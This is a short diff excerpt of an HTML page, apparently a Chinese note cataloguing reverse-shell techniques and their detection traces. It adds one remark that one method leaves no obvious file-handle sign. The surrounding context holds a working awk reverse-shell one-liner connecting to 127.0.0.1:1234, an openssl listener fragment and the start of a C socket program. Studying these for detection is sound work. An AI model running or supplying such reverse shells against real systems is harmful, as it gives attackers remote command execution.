@@ -221,6 +221,7 @@ openssl s_server -quiet -key key.pem -cert cert.pem -port &lt;l_port2&gt; <span 
 <p><img alt="agent" class="img-fluid" src="../images/WeChat8872f342986ad270beb9f2cfed15620b.png"/></p>
 <div class="highlight"><pre><span></span>awk <span class="s1">'BEGIN {s = "/inet/tcp/0/127.0.0.1/1234"; while(42) { do{ printf "shell&gt;" |&amp; s; s |&amp; getline c; if(c){ while ((c |&amp; getline) &gt; 0) print $0 |&amp; s; close(c); } } while(c != "exit") close(s); }}'</span> /dev/null
 </pre></div>
+<p>无明显文件句柄特征</p>
 <div class="highlight"><pre><span></span><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp"></span>
 <span class="cp">#include</span> <span class="cpf">&lt;sys/socket.h&gt;</span><span class="cp"></span>
 <span class="cp">#include</span> <span class="cpf">&lt;sys/types.h&gt;</span><span class="cp"></span>
